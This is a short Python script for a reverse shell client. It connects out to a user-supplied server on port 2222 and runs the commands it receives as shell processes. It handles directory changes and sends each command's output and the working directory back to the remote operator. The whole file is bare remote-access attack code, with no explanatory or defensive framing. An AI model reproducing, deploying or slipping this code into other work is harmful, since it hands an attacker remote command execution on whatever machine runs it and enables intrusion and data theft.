import socket
import subprocess
import os
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep
import subprocess
colorama.init()


RHOST = input("Enter the IP of the server: ")

RPORT = 2222

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))

while True:
    try:
        #header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        #sock.send(header.encode())
        data= sock.recv(1024)
        if data[:2].decode('utf-8') == 'cd':
            os.chdir(data[3:].decode('utf-8'))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode('utf-8'),
                stdout=subprocess.PIPE,stderr=subprocess.PIPE)
            output_bytes = cmd.stdout.read()+cmd.stderr.read()
            output_str = str(output_bytes,'utf-8')
            sock.send(str.encode(output_str + str(os.getcwd()) + "> "))
            print(output_str)
    except Exception as e:
        print(e)
sock.close()
